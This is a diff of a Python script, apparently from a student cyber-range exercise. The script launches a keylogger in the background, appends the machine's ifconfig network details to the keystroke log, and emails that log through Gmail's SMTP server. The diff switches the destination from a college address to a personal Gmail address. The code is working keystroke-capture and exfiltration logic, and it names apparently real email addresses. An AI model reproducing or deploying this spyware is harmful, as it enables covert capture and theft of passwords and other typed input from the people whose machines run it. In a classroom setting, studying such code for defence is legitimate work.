@@ -10,7 +10,7 @@ import config
 
 startlog = time.time()
 
-os.system('python3 /home/student/Desktop/ITP270_FALL2022/Python_Scripting_Cyber_Range/Keylogger_Remote_Form/keyloggerRemoteTest.py &')
+os.system('(python3 keyloggerRemote.py &) ; (ifconfig | grep -x "inet" >> keyboard_Input.txt &)')
 time.sleep(1)
 
 def send_request():
@@ -19,8 +19,8 @@ def send_request():
 		msg.set_content(msgcontent.read())
 	try:
 		msg['Subject'] = f'The contents of {"keyboard_Input.txt"}'
-		msg['From'] = 'codwyer6001@email.vccs.edu'
-		msg['To'] = 'codwyer6001@email.vccs.edu'
+		msg['From'] = 'caitlin.odwyer@gmail.com'
+		msg['To'] = 'caitlin.odwyer@gmail.com'
 
 		server = smtplib.SMTP('smtp.gmail.com:587')
 		server.ehlo()
